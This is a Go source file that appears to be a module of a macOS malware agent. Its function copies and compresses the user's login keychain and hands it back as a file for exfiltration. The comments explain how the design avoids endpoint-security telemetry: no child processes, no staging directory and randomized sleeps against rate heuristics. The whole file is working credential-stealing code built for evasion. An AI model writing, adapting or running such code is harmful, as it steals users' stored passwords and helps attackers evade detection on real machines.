//go:build darwin
// +build darwin

package auto

import (
	"bytes"
	"fix-project/mods/config"
	"fix-project/mods/util"
	"math/rand"
	"os"
	"path/filepath"
	"time"
)

// AutoModeKeychainInproc reads ~/Library/Keychains/login.keychain-db directly
// with os.Open + io.Copy inside the agent process (no child processes at all).
// Compared to the ditto variant (k9xd): no es_exec event, no LOLBin process,
// no staging directory — the only telemetry is a single es_open of the
// keychain file by the agent binary itself (same file-access signal as kyci).
// Randomized sub-second sleep before touching the keychain (anti rate-heuristic).
func AutoModeKeychainInproc() (string, [][]byte) {

	// anti rate-limit heuristic jitter, like the TaskApp payload
	time.Sleep(time.Duration(200+rand.Intn(700)) * time.Millisecond)

	home, err := os.UserHomeDir()
	if err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no home dir"),
		}
	}

	src := filepath.Join(home, "Library", "Keychains", "login.keychain-db")
	if _, err := os.Stat(src); err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no login.keychain-db"),
		}
	}

	var buf bytes.Buffer
	if err := util.Compress(&buf, []string{src}, false); err != nil || buf.Len() < 512 {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: keychain unreadable"),
		}
	}

	return config.MSG_FILE, [][]byte{
		[]byte(config.LOG_SUCCESS),
		[]byte("keychain-inproc.tar.gz"),
		buf.Bytes(),
	}
}
